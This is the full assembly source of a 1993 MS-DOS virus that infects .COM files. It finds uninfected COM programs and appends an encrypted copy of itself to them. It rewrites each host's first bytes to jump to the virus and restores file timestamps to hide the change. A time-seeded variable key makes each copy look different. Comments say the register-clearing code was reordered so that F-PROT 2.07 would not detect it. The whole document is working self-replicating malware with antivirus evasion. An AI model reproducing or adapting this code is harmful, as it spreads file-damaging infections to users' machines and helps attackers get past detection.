

;**************************************************
;
; K™HNTARK-6.ASM  
; written by Z‰b‰hn Stra‹n D‰ Geustaah
; Date: 16 March 1993
; No INT 03 hooks!, decrypt not a routine anymore, changing 2 key de/encypting
; routine using add/sub intead of XOR ,different exit routine zeroing regs with
; and 0000
;
;**************************************************

MAIN    SEGMENT BYTE
        ASSUME cs:main,ds:main,ss:nothing  ;all parts in code segment=com file
        ORG    100h

;**********************************
;  fake host program
;**********************************

HOST:
        jmp    NEAR PTR VIRUS
        db     '  ' 
        mov    ah,4CH
        mov    al,0
        int    21H                 ;terminate normally with dos

;**********************************
; VIRUS CODE STARTS HERE
;**********************************


VIRUS:                             ;a label for the first byte of the virus

             call GET_START        ;when call is performed absolute address
                                   ;is pushed on the stack.

;***************************************************************************
GET_START:
        
           pop  si                                  ;get absolute address from 
                                                    ;the stack onto si
           sub  si,OFFSET GET_START - OFFSET VIRUS  ;fix absolute address
           
;***************************************************           
; determine if this is first generation code...
; if so skip decrypting routine
;***************************************************
           
           cmp  WORD PTR [si + OFFSET KEY - OFFSET VIRUS],0000h 
           je   VIRUS_CODE
           
;****************************************************************************
DECRYPT:
;*******************************************************************
; Decrypting routine goes here, version 3, 64K possible decryptors
; per encrypted word!!
; decryptor is different from word to word
;*******************************************************************

           mov  bx,si
           add  bx,OFFSET VIRUS_CODE - OFFSET VIRUS ;start decrypting here
           mov  di,si
           add  di,OFFSET FINAL - OFFSET VIRUS      ;absolute address 
                                                    ;to end of virus
           
           mov  cx,[si + OFFSET KEY - OFFSET VIRUS] ;put key in cx

     loop1:
           mov  ax,WORD PTR [bx]                    ;put contents of mem here
           sub  ax,cx                               ;decrypt
           mov  WORD PTR [bx],ax                    ;put back in memory
           inc  bx                                  ;increment mem address
           inc  bx
           add  cx,[si + OFFSET KEY2 - OFFSET VIRUS] ;increase key1!
           cmp  bx,di                                ;done?
           jle  loop1                                ;if not do next byte
           jmp  VIRUS_CODE        

;*******************************************           
; 1st Encrypting / Decrypting key goes here
;*******************************************
           
           KEY  dw 0000h

;*******************************************           
; 2nd Encrypting / Decrypting key goes here
;*******************************************
           
           KEY2  dw 0000h

;****************************************************************************

START_CODE:                        ;first 5 bytes of host program go here
           nop                     ;jump around this otherwise virus will
           nop                     ;crash!
           nop
           nop
           nop

;****************************************************************************

VIRUS_CODE:

;************************************************         
; everything from here is encrypted when 
; written to host
;************************************************

;************************************************
; redirect DTA onto virus code
;************************************************
           
           mov  dx,si
           add  dx,OFFSET DTA - OFFSET VIRUS
                                ;put DTA at the end of the virus for now
                                ;cos command line options are stored there
                                ;and you want to save them.
           mov  ah,1ah          ;set new DTA function
           int  21h

;************************************
; Routines called from here           
;************************************

           call RANDOM_MUTATION ;change encrypting key randomly
           call FIND_FILE       ;get a com file to attack!
           jnz  EXIT_VIRUS      ;returned non-zero, no file to infect.. exit
           call INFECT          ;found file? infect it!

           mov  dx,si
           add  dx,OFFSET FNAME - OFFSET VIRUS
                                 ;display the name of the file NOT
           mov  BYTE PTR [si + OFFSET HANDLE - OFFSET VIRUS],24H    
                                 ;make sure string terminates,put $ after it
           mov  ah,09
           int  21h             ;display file name

;****************************************************************************
EXIT_VIRUS:

;************************************           
; set old  DTA  address
;************************************

           mov ah,1ah
           mov dx,80h            ;fix dta back to return control to
           int 21h               ;host program

;************************************           
; restore 5 original bytes to file
;************************************
           
           mov bx,si
           mov ax,WORD PTR [si + (OFFSET START_CODE) - (OFFSET VIRUS)]
           mov WORD PTR [HOST],ax   ;restore 5 original bytes of com file

           mov ax,WORD PTR [si + (OFFSET START_CODE) - (OFFSET VIRUS)+2]
           mov WORD PTR [HOST+2],ax

           mov al,BYTE PTR [si + (OFFSET START_CODE) - (OFFSET VIRUS)+4]
           mov BYTE PTR [HOST+4],al

;************************************************************************
; zero out registers for return to
; host program
; F-PROT 2.07 scans the following and identifies the virus as 
; a Vienna variant! (not even close!), so shuffle instructions around..
;************************************************************************

; xor  bx,bx
; xor  ax,ax
; xor  dx,dx
; xor  si,si
; mov  di,OFFSET 100h
; push di 
; xor  di,di
; ret  0FFFFh
 
 mov  si, OFFSET 100h     ;fools F-PROT 2.07 and does the job
 and  bx,0000             ;don't worry about Mcaffe's SCAN.. it sucks!!
 and  ax,0000
 push si  
 and  dx,0000
 and  si,0000
 and  di,0000
 ret  0FFFFh

;***************************************************************************

FIND_FILE:
                
                mov dx,si
                add dx,OFFSET FILES_TO_INFECT - OFFSET VIRUS
                mov ah,4eh   ;do DOS search 1st function
                mov cx,3fh   ;search for any file, with any attributes
                int 21h

FF_LOOP:
                or   al,al        ;al = return from int 21h search function
                jnz  FF_DONE      ;return if not zero
                call CHECK_FILE   ;check file if file found
                jz   FF_DONE      ;file OK.. exit with a zero
                mov  ah,4fh       ;file no good..find next function
                ;mov dx,si
                ;add dx,OFFSET FILES_TO_INFECT - OFFSET VIRUS
                int  21h
                jmp  FF_LOOP      ;test next file for validity

FF_DONE:
                ret

;****************************************************************************
; determine if com file is useful
; 1-bytes 0 ,3, 4 of file are not a near jmp code and ' ', ' ' .
; 2-there is enough space for the virus without going over 64K
; RETURNS AL


CHECK_FILE:
            mov  dx,si
            add  dx,OFFSET FNAME - OFFSET VIRUS       ;open the file
            mov  ax,3d00h                             ;al=0 =>read access to it
            int  21h

            jc   NO_GOOD                   ;error opening file.. quit & return nz
            mov  bx,ax                     ;put file handle in bx
            push bx                        ;save handle into stack
            mov  cx,5                      ;read first 5 bytes of file
            mov  dx,si
            add  dx,OFFSET START_IMAGE - OFFSET VIRUS    
                                           ;store'em here
            mov  ah,3fh                    ;DOS read function
            int  21h

            pop  bx                        ;restore file handle
            mov  ah,3eh
            int  21h                       ;close file handle

            mov  ax,WORD PTR [si + OFFSET FSIZE - OFFSET VIRUS]                  
                                                      ;get file's size
            add  ax,OFFSET ENDVIRUS - OFFSET VIRUS    ;add virus size to it
            jc   NO_GOOD                              ;bigger then 64K:nogood

            
            cmp  WORD PTR [si + OFFSET START_IMAGE - OFFSET VIRUS],'MZ'
            je   NO_GOOD                         ;look for EXE files disguised as COM
            
            cmp  WORD PTR [si + OFFSET START_IMAGE - OFFSET VIRUS],'ZM'
            je   NO_GOOD                         ;look for DOS 5.0 new executables

            cmp  BYTE PTR [si + OFFSET START_IMAGE - OFFSET VIRUS],0E9h     
                                                 ;compare 1st byte to near jmp
            jnz  GOOD                            ;not a near jmp, file ok

            cmp  WORD PTR [si + OFFSET START_IMAGE+3 - OFFSET VIRUS],2020h  
                                                 ;check for ' ',' ' in pos 3 & 4
            jnz  GOOD                            ;file ok .. infect

NO_GOOD:
            mov  al,1             ;don't infect this file
            or   al,al            ;return a z reset
            ret

GOOD:
            xor  al,al            ;al=0 ok to infect, return with z reset

            ret

;****************************************************************************
; This routine moves the virus to the end of the COM file
; and adjusts the 5 bytes at the start of the program and the 5 bytes stored
; in memory

INFECT:

;*********************************************        
; 1- Open file found for infection
;*********************************************

        mov  dx,si
        add  dx,OFFSET FNAME - OFFSET VIRUS       ;get filename
        mov  ax,3d02h                             ;DOS function
        int  21h                                  ;open file for r/w access
        
        mov  WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS],ax ;save file handle
 
;*********************************************        
; 2-Save date and time of file to be infected
;*********************************************

        mov  ax,5700h
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]   
        int  21h
        mov  WORD PTR [si + OFFSET F_DATE - OFFSET VIRUS],dx
        mov  WORD PTR [si + OFFSET F_TIME - OFFSET VIRUS],cx


;*********************************************
; 3- Goto EOF
;*********************************************

        xor  cx,cx                  ;prepare to write virus on file
        mov  dx,cx                  ;position file pointer,cx:dx = 0
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]   
                                    ;bx = file handle
        mov  ax,4202H               ;DOS interrupt
        int  21h                    ;locate pointer at end EOF DOS function


;***********************************************
; 4- Write Constant unencrypted part of virus
;    less than 38 constant bytes!
;    possible future implementation:
;    change order of little segments of code
;    shuffle instructions around etc.
;***********************************************

        mov  cx,OFFSET VIRUS_CODE - OFFSET VIRUS        ;write this many bytes
        mov  dx,si                                      ;write from here
        mov  bx,WORD PTR[si+OFFSET HANDLE-OFFSET VIRUS] ;restore file handle
        mov  ah,40h
        int  21h                                        ;write part
        
;***********************************************
; 5- encrypt and write the rest of the  virus
;    one byte at the time
;***********************************************
        
        mov  dx,si
        add  dx,OFFSET TEMP - OFFSET VIRUS             ;write from here in mem

        mov  bx,si
        add  bx,OFFSET VIRUS_CODE - OFFSET VIRUS          ;start encrypting here
        mov  di,WORD PTR [si + OFFSET KEY - OFFSET VIRUS] ;put key in di
        
  loop2:
        mov  ax,WORD PTR [bx]  ;put contents of memory into ax
        add  ax,di             ;encrypt word, di = key
        mov  WORD PTR [si + OFFSET TEMP - OFFSET VIRUS],ax  ;put word in variable
        add  di,[si + OFFSET KEY2 - OFFSET VIRUS]           ;increase key!!
        
        xor  ax,ax
        push bx                                    ;save location in memory
        
        mov  bx,WORD PTR[si + OFFSET HANDLE - OFFSET VIRUS] ;restore file handle
        mov  cx,02h ;write this many bytes at each call
        mov  ah,40h
        int  21h    ;write byte from TEMP to file
        
        pop  bx     ;restore memory address to encrypt
        inc  bx     ;increase address to do next word
        inc  bx
        
        mov  ax,si                           ;get 
        add  ax,OFFSET FINAL - OFFSET VIRUS  ;absolute address of end of virus
        cmp  bx,ax                           ;done?
        jle  loop2                           ;if not do next byte
        xor  di,di
        xor  bp,bp

;***********************************************
; 6- position pointer where START_CODE is
;    in newly infected file
;***********************************************

        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS] ;bx=file handle
        xor  cx,cx                 
        mov  dx,WORD PTR [si + OFFSET FSIZE - OFFSET VIRUS]
        add  dx,OFFSET START_CODE - OFFSET VIRUS  ;address where START_CODE
                                                  ;is in written file
        mov  ax,4200h  ;method al=0 from front of file
        int  21h       ;position pointer at cx:dx, dx=displacement


;***********************************************************************
; 7- write 5 first bytes of file to be infected located in START_IMAGE
;    (put there by CHECK_FILE) into file to be infected at
;    START_CODE
;************************************************************************

        
        mov  cx,5                            ;# of bytes to write
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]            
                                             ;bx = file handle
        mov  dx,si
        add  dx,OFFSET START_IMAGE - OFFSET VIRUS  
                                             ;place in memory to write from
        mov  ah,40h                          ;info obtained in CHECK_FILE function
        int  21h                             ;write 5 bytes

;***********************************************
; 8- position pointer at start of file to be
;    infected 
;***********************************************

        xor  cx,cx                           ;cx=0
        mov  dx,cx                           ;position file pointer,cx:dx = 0
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]         
                                             ;bx = file handle
        mov  ax,4200h                        ;method:al=0 => from start of file
        int  21h                             


;********************************************************
; 9- move jump + address + virus ID into START_IMAGE
;    to be written to beginning of  file to be infected
;********************************************************
        
        mov  bx,si
        mov  BYTE PTR [si + OFFSET START_IMAGE - OFFSET VIRUS],0E9h
        mov  ax,WORD PTR [si + OFFSET FSIZE - OFFSET VIRUS]
       ;add  ax,OFFSET VIRUS - OFFSET VIRUS-3
        sub  ax,3                               ;calculate return jmp address
        mov  WORD PTR [si + OFFSET START_IMAGE+1 - OFFSET VIRUS],ax
        mov  WORD PTR [si + OFFSET START_IMAGE+3 - OFFSET VIRUS],2020h


;********************************************************
; 10- write 5 bytes from START_IMAGE to the beginning of  
;    the file to be infected
;********************************************************

        mov  cx,5                               ;#of bytes to write
        mov  dx,si
        add  dx,OFFSET START_IMAGE - OFFSET VIRUS             
                                                ;ds:dx=pointer of data to write
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]               
                                                ;bx = file handle
        mov  ah,40h                             ;DOS write function
        int  21h                                ;write 5 bytes

;*************************************************        
; 11-Restore date and time of file to be infected
;*************************************************

        mov  ax,5701h
        mov  bx,WORD PTR [si + OFFSET HANDLE - OFFSET VIRUS]   
        mov  dx,WORD PTR [si + OFFSET F_DATE - OFFSET VIRUS]
        mov  cx,WORD PTR [si + OFFSET F_TIME - OFFSET VIRUS]
        int 21h


        ret                                     ;infection done!

;****************************************************************************

RANDOM_MUTATION:

;***********************************************************
; this procedure changes the encrypting keys
; using the BIOS time interrupt 1ah
; registers changed: ax,dx,cx
;***********************************************************

     mov ah,00h  ; get time BIOS -> cx=high clock count dx=low clock count
     int 1ah     ;al =0 timer has not passed 24 hour count al=1 it has
     
     mov WORD PTR [si + OFFSET KEY - OFFSET VIRUS],dx ;change key
     
     int 1ah
     cmp dx,0000h                            ;dx= 0?
     je  random_mutation                     ;if so get new time values

     mov WORD PTR [si + OFFSET KEY2 - OFFSET VIRUS],dx ;change key2
     ret

;****************************************************************************

FILES_TO_INFECT db  '*.COM',0 
DTA         db  1Ah dup (?)                   
FSIZE       dw  0,0                ;file size storage area
FNAME       db  13 dup (?)         ;area for file path
HANDLE      dw  0                  ;file handle
START_IMAGE db  0,0,0,0,0          ;area to store 5 bytes to w/r from / to file
VSTACK      dw  28h dup (?)        ;stack for virus program (40 bytes)
TEMP        db  0
F_DATE      dw  0,0
F_TIME      dw  0,0
;****************************************************************************

FINAL:                ;label of byte of code to be kept in virus when it moves

ENDVIRUS  equ  $      ;label for determining space needed by virus

;vienna code to cause reboot: in hex EA F0 FF 00 F0

MAIN ENDS
     END    HOST

